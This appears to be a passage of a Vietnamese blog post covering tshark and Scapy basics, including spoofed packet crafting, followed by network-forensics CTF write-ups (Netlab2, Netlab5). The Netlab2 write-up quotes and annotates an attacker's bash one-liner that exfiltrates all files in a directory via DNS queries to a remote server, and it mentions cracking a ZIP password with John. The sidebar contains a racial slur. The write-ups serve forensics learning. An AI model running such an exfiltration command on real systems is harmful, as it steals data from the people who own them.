<pre tabindex="0"><code>tshark -r input.pcap -Y &#34;protocol_name&#34; -w output.pcap
</code></pre><p>Cũng có thể áp dụng tương tự với lọc theo địa chỉ IP, URL,&hellip;
Ngoài ra có thể sử dụng <a href="https://tshark.dev/edit/editcap/">editcap</a> để cắt file.</p>
<p><strong>Scapy</strong>
Một thư viện Python được sử dụng để có thể gửi, phân tích, tạo các gói tin mạng.
Để đọc file pcap, mình sử dụng lệnh rdpcap:</p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">import scapy.all
#import toàn bộ các gói tin vào tập packets
packets = rdpcap(&#34;inp.pcap&#34;)
#xem gói tin thứ 1
pkt = packets[0]
pkt.show()
</code></pre><p>Truy xuất theo lớp: có thể truy cập các lớp này với cú pháp mảng hoặc tên lớp, ví dụ như:</p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">#Kiểm tra có lớp IP không, nếu có in source add
if pkt.haslayer(&#39;IP&#39;):
    print(f&#34;IP Source: {pkt[&#39;IP&#39;].src}&#34;)
</code></pre><p>Cũng có thể truy xuất nhiều trường thông tin khác, hoặc truy xuất trực tiếp như này:</p>
<pre tabindex="0"><code class="language-python=" data-lang="python="># Lấy thông tin lớp IP
ip_layer = pkt.getlayer(&#39;IP&#39;)

# Lấy thông tin lớp TCP
if pkt.haslayer(&#39;TCP&#39;):
    print(f&#34;Source Port: {pkt[&#39;TCP&#39;].sport}&#34;)
    print(f&#34;Dest Port: {pkt[&#39;TCP&#39;].dport}&#34;)
</code></pre><p>Để tạo gói tin giả mạo, với khả năng tạo gói tin của scapy thì tuỳ loại gói tin sẽ cần các cách triển khai khác nhau. Nhìn chung thì với việc các gói tin được cấu thành từ nhiều layer hay nhiều lớp, thì việc tạo các gói tin theo từng giao thức cũng sẽ là chồng các lớp khác nhau theo cách phù hợp. Ví dụ như tạo gói tin ping fa kè:</p>
<pre tabindex="0"><code>pkt = IP(src=&#34;1.1.1.1&#34;, dst=&#34;192.168.1.1&#34;) / ICMP()
</code></pre><p>hoặc gói TCP SYN:</p>
<pre tabindex="0"><code>packet = Ether() / IP(dst=&#34;google.com&#34;) / TCP(dport=80, flags=&#34;S&#34;)
</code></pre><p><strong>Viết script Python dùng Scapy gửi 1 gói tin ICMP (Ping) đến 8.8.8.8 và in ra phản hồi</strong>
Script:</p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">from scapy.all import IP, ICMP, sr1
#Cấu hình gói tin gửi đi với các tham số
packet = IP(dst=&#34;8.8.8.8&#34;) / ICMP(id=1234, seq=1)

#Sử dụng sr1 để gửi 1 gói tin đi và nhận về 1 response tương ứng.
reply = sr1(packet, timeout=5, verbose=True)

if reply:
    reply.show()
else:
    print(&#34;Failed&#34;)
</code></pre><blockquote>
<p>Bằng một cách nào đó, khi cấu hình packet gửi đi là <code>packet = IP(dst=&quot;8.8.8.8&quot;) / ICMP()</code> , tức không cấu hình tham số ID và Seq, thì sau khi gửi ping đi lại không nhận được phản hồi. Có vẻ như là với ID và Seq mặc định thì packet bị chặn hoặc bị lọc.</p>
</blockquote>
<p>Nhận được response như sau:</p>
<pre tabindex="0"><code>Begin emission

Finished sending 1 packets

Received 4 packets, got 1 answers, remaining 0 packets
###[ IP ]###
  version   = 4
  ihl       = 5
  tos       = 0x0
  len       = 28
  id        = 0
  flags     =
  frag      = 0
  ttl       = 119
  proto     = icmp
  chksum    = 0x3bc2
  src       = 8.8.8.8
  dst       = 192.168.55.103
  \options   \
###[ ICMP ]###
     type      = echo-reply
     code      = 0
     chksum    = 0xfb2d
     id        = 0x4d2
     seq       = 0x0
     unused    = b&#39;&#39;
</code></pre><p>Câu lệnh Tshark để đếm số lượng gói tin TCP gửi đến port 80 trong 1 file pcap:
Gói tin cần chọn sẽ là các gói tin TCP, dstport là 80, câu lệnh sẽ là:</p>
<pre tabindex="0"><code class="language-python!" data-lang="python!">tshark -r input.pcap -Y &#34;tcp.dstport == 80&#34;
</code></pre><p>Với câu lệnh trên, chắc chắn sẽ in ra một list các gói tin như này:
<img src="https://hackmd.io/_uploads/r1xhLB9UZl.png" alt="image">
Tuy nhiên, chúng ta chỉ cần biết tổng số gói tin =&gt; ta có thể sử dụng cú pháp <code>(command).Count</code>, sẽ là <code>(tshark -r input.pcap -Y tcp.dstport == 80).Count</code>:
<img src="https://hackmd.io/_uploads/Hy5fPB9UWe.png" alt="image"></p>
<p>:::info
<strong>Các lệnh tshark cơ bản:</strong>
<code>tshark -D</code>: Liệt kê tất cả các network interfaces có sẵn trên máy tính của bạn.
<code>tshark -i &lt;order&gt;</code>: Chọn một giao diện cụ thể để bắt đầu bắt gói tin. Ví dụ: <code>tshark -i 1</code>. Số thứ tự này sẽ tương ứng ở trong output sau <code>tshark -D</code>.
<code>tshark -w &lt;input.pcap&gt;</code>: Ghi dữ liệu đang bắt được vào một file để phân tích sau này thay vì chỉ hiển thị trên màn hình.
<code>tshark -r &lt;input.pcap&gt;</code>: Đọc và hiển thị nội dung của một file pcap đã có sẵn.
<code>tshark -T &lt;format&gt;</code>: Thay đổi định dạng hiển thị của dữ liệu đầu ra.
<code>tshark -T fields -e &lt;field_name&gt;</code>: Trích xuất các trường dữ liệu cụ thể từ gói tin.
<code>tshark -Y &quot;&lt;criteria&gt;&quot;</code>: Sử dụng bộ lọc hiển thị (Display Filter) để chỉ xem các gói tin thỏa mãn điều kiện.
<code>tshark -z &lt;thống_kê&gt;:</code> Tạo các báo cáo thống kê về lưu lượng mạng
:::</p>
<h1 id="4-ctf">
<a class="header-anchor" href="#4-ctf"></a>
4. CTF
</h1><h3 id="1-netlab2">
<a class="header-anchor" href="#1-netlab2"></a>
1. Netlab2:
</h3><p>Description:</p>
<blockquote>
<p>Bquanman NetLab2: Protected Vault
The time limit exceeded. You will not receive the Trophy for this puzzle.
We received a letter threatening that our data has been compromised and if we do not pay the ransom, all will be made public. We wonder how he managed to get it even though we protected it carefully</p>
</blockquote>
<p>Mở file bằng Wireshark. Đọc description thì có vẻ đây sẽ là một challenge liên quan đến việc data leak hoặc xâm nhập hệ thống. Ta có thể tư duy theo hướng attacker sử dụng tunneling.
Nghĩ đến tunneling thì ta đi kiểm tra các DNS packets trước:
Lọc các gói DNS ra xem thử thì thấy rằng điểm chung của chúng đều là có query name khá kì lạ, tất cả đều trông có vẻ như đã bị mã hoá kiểu gì đó gần với base64 nhưng base64 lại không có dấu <code>{ }</code>
<img src="https://hackmd.io/_uploads/ryghqBq8Wl.png" alt="image">
Kiểm tra các gói tin còn lại, ta thấy một packet HTTP khá là lạ:
<img src="https://hackmd.io/_uploads/B1UYsS5LZe.png" alt="image"></p>
<pre tabindex="0"><code class="language-html!" data-lang="html!">for f in $(ls .); do s=4;b=50;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed &#34;s/.\{$b\}/&amp;\n/g&#34;);do if [[ &#34;$c&#34; -lt &#34;$s&#34;  ]]; then echo -ne &#34;$i-.&#34;; c=$(($c+1)); else echo -ne &#34;\n$i-.&#34;; c=1; fi; done ); do dig +tries=1 +timeout=1 +noidnin +noidnout @10.2.32.72 `echo -ne $r$(echo $f|base58)|tr &#34;+&#34; &#34;}&#34;|tr &#34;/&#34; &#34;{&#34;` +short; done ; done
</code></pre><p>Viết lại chút cho dễ đọc:</p>
<pre tabindex="0"><code class="language-bash=" data-lang="bash=">for f in $(ls .);
#Duyệt các file trong thư mục
    do s=4;b=50;c=0;
    #gán tham số
    for r in $(for i in $(gzip -c $f| base64 -w0 | sed &#34;s/.\{$b\}/&amp;\n/g&#34;);
    # mã hoá từng file bằng cách nén nội dung file để giảm dung lượng| chuyển sang base64|chia data thành đoạn nhỏ, mỗi đoạn 50 kí tự
        do 
        if [[ &#34;$c&#34; -lt &#34;$s&#34;  ]];
            then echo -ne &#34;$i-.&#34;;
            c=$(($c+1));
            #Nhóm các đoạn nhỏ lại thành một chuỗi dài hơn, cách nhau bởi dấu - và . 
        else echo -ne &#34;\n$i-.&#34;;
            c=1;
            fi;
    done );
do dig +tries=1 +timeout=1 +noidnin +noidnout @10.2.32.72 `echo -ne $r$(echo $f|base58)|tr &#34;+&#34; &#34;}&#34;|tr &#34;/&#34; &#34;{&#34;` +short;
#Thực hiện query đến địa chỉ 10.2.32.72 với nội dung là các mảnh dữ liệu bị mã hoá. Mỗi đoạn data được ghép với tên file được base58
    done ;
done
</code></pre><p>Công việc của mình bây giờ là làm ngược lại thui. Với việc số lượng gói tin quá nhiều để làm thủ công, thì nên dùng script để tự động hoá quy trình.</p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">import base64
import gzip
from base58 import b58decode
from scapy.all import rdpcap, DNS, DNSQR
import os

def recover(pcap_path):
    try:
        packets = rdpcap(pcap_path)
    except Exception as e:
        print(e)
        return

    print(len(packets))
    file_data = {} 
    dns_count = 0

    for packet in packets:
        if packet.haslayer(DNS) and packet.haslayer(DNSQR):
            dns_count += 1
            #vì data được ghi ở query name =&gt; lấy qrname và xóa dấu chấm ở cuối
            query = packet[DNSQR].qname.decode().strip(&#34;.&#34;)
            clean_query = query.replace(&#34;.&#34;, &#34;&#34;)
            parts = clean_query.split(&#34;-&#34;)
            
            if len(parts) &lt; 2:
                continue

            try:
                #phần cuối là tên file Base58
                encoded_filename = parts[-1]
                decoded_name = b58decode(encoded_filename).decode(&#39;utf-8&#39;).strip()
                
                #các phần trước là dữ liệu bị mã hoá
                chunks = &#34;&#34;.join(parts[:-1])
                
                if decoded_name not in file_data:
                    file_data[decoded_name] = &#34;&#34;
                
                file_data[decoded_name] += chunks
            except:
                continue

    if not file_data:
        print(&#34;Not found&#34;)
        return

    if not os.path.exists(&#34;recovered&#34;): os.makedirs(&#34;recovered&#34;)

    for filename, encoded_str in file_data.items():
        try:
            #đoạn này nhờ gpt fix :v
            base64_str = encoded_str.replace(&#34;}&#34;, &#34;+&#34;).replace(&#34;{&#34;, &#34;/&#34;)
            missing_padding = len(base64_str) % 4
            if missing_padding: base64_str += &#34;=&#34; * (4 - missing_padding)
            
            raw_bytes = base64.b64decode(base64_str)
            
            #giải nén gzip
            try:
                final_content = gzip.decompress(raw_bytes)
                save_name = filename
            except:
                final_content = raw_bytes
                save_name = filename + &#34;.bin&#34;

            with open(f&#34;recovered/{save_name}&#34;, &#34;wb&#34;) as f:
                f.write(final_content)
            print(f&#34;Recovered: {save_name}&#34;)
        except Exception as e:
            print(e)

recover(&#39;netlab2.pcap&#39;)
</code></pre><p>Chạy script trên thì ra được các file:
<img src="https://hackmd.io/_uploads/B1XqQD9Ube.png" alt="image">
Có file Flag bị khoá bởi password:
<img src="https://hackmd.io/_uploads/SJUW4w9UZl.png" alt="image">
Nghĩ đến ngay dùng John để crack:
<img src="https://hackmd.io/_uploads/SyD7ED5U-x.png" alt="image">
Mở file và bú ngay:
<img src="https://hackmd.io/_uploads/SJN8NDqI-g.png" alt="image"></p>
<h3 id="2-netlab5">
<a class="header-anchor" href="#2-netlab5"></a>
2. Netlab5:
</h3><p>Description:</p>
<blockquote>
<p>Our system is becoming overloaded and paralyzed, unable to respond to any input. It seems that someone is trying to attack us with some kind of DDoS attack.
Cre: bquanman</p>
</blockquote>
<p>DDos Attack thì ta mở file lên và check xem loại packet nào được sử dụng nhiều nhất:
<img src="https://hackmd.io/_uploads/rkAwHD9L-x.png" alt="image">
Ở đây ta thấy hai loại được sử dụng nhiều nhất là packet QUIC và TCP. Mình kiểm tra các packet QUIC trước:
<img src="https://hackmd.io/_uploads/By7OUP9IWe.png" alt="image">
Các packet này có phần payload hơi kì lạ, trông có vẻ là base64.
<img src="https://hackmd.io/_uploads/rkLJPD98be.png" alt="image">
Thử decode nhưng chẳng ra gì lắm, nên chuyển qua TCP Packet xem sao.
<img src="https://hackmd.io/_uploads/ByuUDwqL-e.png" alt="image">
Lướt qua 1 vài file, em D để ý rằng ở một vài packet, ở 6 bytes cuối có một số chỗ là readable char, và điểm chung của chúng đều là các SYN Packet:
<img src="https://hackmd.io/_uploads/rk4nDDcI-e.png" alt="image">
<img src="https://hackmd.io/_uploads/SkP6PDcU-e.png" alt="image">
Lọc lại một lần nữa xem như thế nào thì đúng như vậy thật:
<img src="https://hackmd.io/_uploads/B1eldvq8Zg.png" alt="image">
Từ đây ta có thể suy luận được rằng: có một cái gì đó được giấu trong các packet này? Ta viết script thực hiện công việc: lọc tất cả các packet TCP SYN, trích xuất 6bytes cuối của packet và ghép chúng lại, giải mã từ hex về ASCII:</p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">from scapy.all import rdpcap, TCP
import binascii
hex = &#34;&#34;
packets = rdpcap(&#39;netlab5.pcap&#39;)

for pkt in packets:
    #TCP SYN có flags là 0x002
    if pkt.haslayer(TCP) and pkt[TCP].flags == 0x002:
        raw = bytes(pkt)
        if len(raw) &gt;= 6:
            last_6 = raw[-6:]
            hex += last_6.hex()
if hex:
    decoded_text = binascii.unhexlify(hex).decode(&#39;utf-8&#39;, errors=&#39;replace&#39;)
    print(decoded_text)
else:
    print(&#34;Not found&#34;)
</code></pre><p>Output:</p>
<pre tabindex="0"><code class="language-text!" data-lang="text!">I miss the days when life was so imple Felt like the glass was lways half full Where did that go? And every econd with you was so ecial Back when we idn&#39;t fear the nowns But that was long ago Who can say where the path will go? phers guess but they just don&#39;t know Maybe hat&#39;s why We had our head in the louds ought we had it all gured out nning to fly away To scape thing on the round But like a plane up in space We lowly ifted away And every plan that we made And dream that we hased Are just ories now ey&#39;re just ories now I&#39;m not sure where thing went wrong But I know that we anded where we both elong Where we both long) I just wish we ren&#39;t cared to say That ere&#39;s ation dates on the iends you make As hard as that may sound Who can say where the path will go? phers guess but they just don&#39;t know Maybe hat&#39;s why We had our head in the louds ought we had it all gured out nning to fly away To scape thing on the round But like a plane up in space We lowly ifted away And every plan that we made And dream that we hased Are just ories now ey&#39;re just ories now Who can say where the path will go? Where the path will go? Where the path will go?) phers guess but they just don&#39;t know (But they just don&#39;t know)||||||TCP SYN flood .k.a. SYN lood) is a type of buted enial of rvice DDoS) ttack that loits part of the ormal TCP e-way shake to nsume urces on YWxlcnQoJ0ZsYWd7Tm0TGFiNV9TWU5fRkwwb2RfYjRuTjNkfScp the geted erver and ender it sive.  ally, with SYN flood DDoS, the ender sends TCP ction uests aster than the geted chine can ocess them, using twork ation.
</code></pre><p>=))) có gì đó sai sai vì có mấy chỗ bị mất chữ. Kiểm tra lại thì có một số packet không chỉ là 6 bytes cuối:
<img src="https://hackmd.io/_uploads/rJlziv58-l.png" alt="image">
Vậy là phải là dữ liệu được nhúng từ bytes thứ 55 trở đi. Ngoài ra, lẫn trong đó còn là một số packet không có readable bytes đều không xuất phát từ IP 192.52.12.51. Chỉnh lại script 1 chút:</p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">from scapy.all import rdpcap, TCP,IP
import binascii

FILE_PCAP = &#39;netlab5.pcap&#39;
hex = &#34;&#34;

packets = rdpcap(FILE_PCAP)

for pkt in packets:
    #TCP SYN có flags là 0x002
    if pkt.haslayer(TCP) and pkt[TCP].flags == 0x002 and pkt[IP].src == &#39;192.52.12.51&#39;:
        raw = bytes(pkt)
        if len(raw) &gt; 54:
            extracted_part = raw[54:]
            hex += extracted_part.hex()

if hex:
    try:
        decoded_text = binascii.unhexlify(hex).decode(&#39;utf-8&#39;, errors=&#39;replace&#39;)
        print(decoded_text)
    except Exception as e:
        print(e)
else:
    print(&#34;Not found&#34;)
</code></pre><p>Output:</p>
<pre tabindex="0"><code class="language-text!" data-lang="text!">I miss the days when life was so simple Felt like the glass was always half full Where did that go? And every second with you was so special Back when we didn&#39;t fear the unknowns But that was long ago Who can say where the path will go? Philosophers guess but they just don&#39;t know Maybe that&#39;s why We had our head in the clouds Thought we had it all figured out Planning to fly away To escape everything on the ground But like a plane up in space We slowly drifted away And every plan that we made And dream that we chased Are just memories now They&#39;re just memories now I&#39;m not sure where everything went wrong But I know that we landed where we both belong (Where we both belong) I just wish we weren&#39;t scared to say That there&#39;s expiration dates on the friends you make As hard as that may sound Who can say where the path will go? Philosophers guess but they just don&#39;t know Maybe that&#39;s why We had our head in the clouds Thought we had it all figured out Planning to fly away To escape everything on the ground But like a plane up in space We slowly drifted away And every plan that we made And dream that we chased Are just memories now They&#39;re just memories now Who can say where the path will go? (Where the path will go? Where the path will go?) Philosophers guess but they just don&#39;t know (But they just don&#39;t know)|||||||||||||TCP SYN flood (a.k.a. SYN flood) is a type of Distributed Denial of Service (DDoS) attack that exploits part of the normal TCP three-way handshake to consume resources on YWxlcnQoJ0ZsYWd7TmV0TGFiNV9TWU5fRkwwb2RfYjRuTjNkfScp the targeted server and render it unresponsive.  Essentially, with SYN flood DDoS, the offender sends TCP connection requests faster than the targeted machine can process them, causing network saturation.
</code></pre><p>ye:
<img src="https://hackmd.io/_uploads/rJFUpwcL-l.png" alt="image">
Sau khi tham khảo lại wu của Đức Anh thì em Dũng mới biết đó là phần payload của packet. Vì thế mà thêm một cách khác để trích xuất bằng tshark. Với filter lọc ra các gói tin như trên, thì lựa chọn trường payload của gói tin tcp có thể trích xuất bằng câu lệnh sau:</p>
<pre tabindex="0"><code class="language-t!" data-lang="t!">tshark -r &#34;netlab5.pcap&#34; -Y &#34;tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0 &amp;&amp; ip.src == 192.52.12.51&#34; -T fields -e tcp.payload
</code></pre><p>Có thể define một chút để tự nối với nhau, xuất ra một file txt:</p>
<pre tabindex="0"><code class="language-t!" data-lang="t!">(tshark -r &#34;netlab5.pcap&#34; -Y &#34;tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0 &amp;&amp; ip.src == 192.52.12.51&#34; -T fields -e tcp.payload) -join &#34;&#34; &gt; out.txt
</code></pre><p>Đến đây thì chuyển từ hex -&gt; ascii rồi lụm như trên thôi!</p>
</div>
    <footer class="article-footer"><ul class="article-category-list"></ul>
<ul class="article-tag-list" itemprop="keywords"></ul>
</footer>
  </div></article></section>
        </div><footer id="footer" aria-label="Site footer">
  <div style="width: 100%; overflow: hidden">
    <div class="footer-line"></div>
  </div>
  <div id="footer-info"><div>
      <span class="icon-copyright"></span>2020-2026<span class="footer-info-sep "></span>deroise2306
    </div><div>
        Powered by&nbsp;<a
          href="https://gohugo.io/"
          target="_blank"
          rel="noopener nofollow noreferrer"
          >Hugo</a
        >&nbsp;Theme.<a
          href="https://github.com/D-Sketon/hugo-theme-reimu"
          target="_blank"
          rel="noopener nofollow noreferrer"
          >Reimu</a
        >
      </div><div>
        <span class="icon-brush"
          >&nbsp;0</span
        >
        &nbsp;|&nbsp;
        <span class="icon-coffee">&nbsp;00:00</span>
      </div><div>
        <span class="icon-eye"></span>
        <span id="busuanzi_container_site_pv"
          >Number of visits&nbsp;<span
            id="busuanzi_value_site_pv"
          ></span
        ></span>
        &nbsp;|&nbsp;
        <span class="icon-user"></span>
        <span id="busuanzi_container_site_uv"
          >Number of visitors&nbsp;<span
            id="busuanzi_value_site_uv"
          ></span
        ></span>
      </div></div>
</footer>
<div class="sidebar-top">
            <div class="sidebar-top-taichi rotate"></div>
            <div class="arrow-up"></div>
          </div><div id="mask" class="hide"></div>
      </div><nav id="mobile-nav" aria-label="Mobile navigation">
  <div class="sidebar-wrap"><div class="sidebar-author">
  <img
    data-src="/avatar/avatar.webp"
    data-sizes="auto"
    alt="deroise2306"
    class="lazyload"
  />
  <div class="sidebar-author-name">deroise2306</div>
  <div class="sidebar-description">Lovely nigga</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div><div class="sidebar-state-number">0</div>
  </div>
  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
    <div>Categories</div>
    <div class="sidebar-state-number">
      0
    </div>
  </a>
  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
    <div>Tags</div>
    <div class="sidebar-state-number">0</div>
  </a>
</div>
<div class="sidebar-social" ></div><div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/"
        aria-label="Home"
      ></a><div class="sidebar-menu-link">Home</div>
    </div><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/archives"
        aria-label="Archives"
      ></a><div class="sidebar-menu-link">Archives</div>
    </div><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/about"
        aria-label="About"
      ></a><div class="sidebar-menu-link">About</div>
    </div></div></div></nav>
</div><script
    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
    
    
    
    
    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
    
    
    
    
    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js"  ></script><script src="/js/aos.js"  ></script><script>
    var aosInit = () => {
      AOS.init({
        duration: 1000,
        easing: "ease",
        once: true,
        offset: 50,
      });
    };
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", aosInit);
    } else {
      aosInit();
    }
  </script><script src="/js/pjax_main.js" data-pjax ></script><script>
  var setupFirework = () => {
    if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
      if (window.firework) {
        const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
        options.excludeElements = options.excludeelements;
        delete options.excludeelements;
        window.firework(options);
      }
    }
  }
</script><script
    src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js"
    defer
    
    
    onload="setupFirework()"
    integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8&#43;pUoWX8n1rgq282T" crossorigin="anonymous"></script>

<div id="lazy-script">
  <div><script data-pjax>
        window.REIMU_POST = {
          author: "deroise2306",
          title: "Test",
          url: "http:\/\/localhost:1313\/archives\/test_post\/",
          description: "\r1. GÓI TIN\rMô hình OSI \u0026amp; TCP\/IP: Mapping dữ liệu thực tế trong file pcap vào các lớp OSI. Dữ liệu nào nằm ở Layer 2, 3, 4, 7? Tham chiếu lại hai mô hình; Layer PDU Giao thức Vị trí Layer 2 (Data Link) Frame Ethernet II 14 bytes đầu Layer 3 (Network) Packet IPv4, IPv6, ICMP Tiếp nối sau Ethernet …",
          cover: "http:\/\/localhost:1313\/images\/banner.webp",
        };
      </script><script src="/js/insert_highlight.js" data-pjax ></script><script src="/js/tabs.js" data-pjax defer></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
          if (_$$(`${gallery} ${children}`).length > 0) {
            new PhotoSwipeLightbox({
              gallery,
              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
          }
        }
        const pswp = () => {
          initPswp('.article-entry', 'a.article-gallery-item');
          initPswp('.article-gallery', 'a.article-gallery-item');
        }
        pswp()
      </script></div>
</div><script
    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
    
    async
    
    
    integrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.getRegistrations().then((registrations) => {
        for (let registration of registrations) {
          registration.unregister();
        }
      });
    }
  </script><script>
  const reimuCopyright = String.raw`
   ______     ______     __     __    __     __  __    
  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
                                                    
  `;
  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
  console.log(
    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
    "color: white; background: #ff5252; padding:5px 0;",
    "padding:4px;border:1px solid #ff5252;",
  );
</script></body>
</html>
